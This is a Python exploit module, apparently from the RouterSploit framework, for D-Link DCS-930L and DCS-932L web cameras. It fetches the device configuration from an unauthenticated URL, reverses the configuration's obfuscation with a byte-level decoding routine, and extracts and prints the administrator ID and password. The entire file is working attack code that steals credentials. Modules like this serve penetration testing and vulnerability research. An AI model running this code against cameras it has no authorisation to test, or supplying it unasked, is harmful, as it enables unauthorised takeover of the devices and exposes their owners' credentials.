import re
from routersploit import (
    exploits,
    print_error,
    print_table,
    print_success,
    http_request,
    mute,
    validators
)


class Exploit(exploits.Exploit):
    """
    D-Link DCS web cameras allow unauthenticated attackers to obtain the
    configuration of the device remotely. A copy of the device configuration can be
    obtained by accessing unprocteted URL.
    """
    __info__ = {
        'name': 'D-Link DCS Cameras Authentication Bypass',
        'description': 'D-Link DCS web cameras allow unauthenticated attackers to obtain the configuration of the device remotely.'
                       ' A copy of the device configuration can be obtained by accessing unprocteted URL.',
        'authors': [
            'Roberto Paleari',  # vulnerability discovery
            'Dino Causevic',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/24442/',
        ],
        'devices': [
            'D-Link DCS-930L, firmware version 1.04',
            'D-Link DCS-932L, firmware version 1.02'
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(8080, 'Target port')  # default port
    config_content = None

    def _deobfuscate(self, config):

        def chain(lambdas, value):
            r_chain = None

            for l in lambdas:
                r_chain = value = l(value)

            return r_chain

        arr_c = [chain([
            lambda d: ord(d),
            lambda d: (d + ord('y')) & 0xff,
            lambda d: (d ^ ord('Z')) & 0xff,
            lambda d: (d - ord('e')) & 0xff
        ], t) for t in config]

        arr_c_len = len(arr_c)
        tmp = ((arr_c[arr_c_len - 1] & 7) << 5) & 0xff

        for t in reversed(xrange(arr_c_len)):

            if t == 0:
                ct = chain([
                    lambda d: (d >> 3) & 0xff,
                    lambda d: (d + tmp) & 0xff
                ], arr_c[t])
            else:
                ct = (((arr_c[t] >> 3) & 0xff) + (((arr_c[t - 1] & 0x7) << 5) & 0xff)) & 0xff

            arr_c[t] = ct

        tmp_str = "".join(map(chr, arr_c))
        ret_str = ""

        if len(tmp_str) % 2 != 0:
            print_error("Config file can't be deobfuscated.")
            return None

        for i in xrange(len(tmp_str) / 2):
            ret_str += tmp_str[i + (len(tmp_str) / 2)] + tmp_str[i]

        return ret_str

    def run(self):

        if self.check():
            print_success("Target appears to be vulnerable.")

            admin_id = None
            admin_password = None

            if self.config_content and len(self.config_content):

                for line in self.config_content.split("\n"):
                    line = line.strip()

                    m_groups = re.match(r'AdminID=(.*)', line, re.I | re.M)
                    if m_groups:
                        print_success("Found Admin ID.")
                        admin_id = m_groups.group(1)

                    m_groups = re.match(r'AdminPassword=(.*)', line, re.I | re.M)
                    if m_groups:
                        print_success("Found Admin password.")
                        admin_password = m_groups.group(1)
                        break

                print_table(("AdminId", "Password"), (admin_id, admin_password))

        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/frame/GetConfig".format(self.target, self.port)
        response = http_request(method="GET", url=url)

        if response is not None and len(response.content) and response.status_code == 200:
            self.config_content = self._deobfuscate(response.content)
            return True if self.config_content else False  # target is vulnerable

        return False  # target is not vulnerable
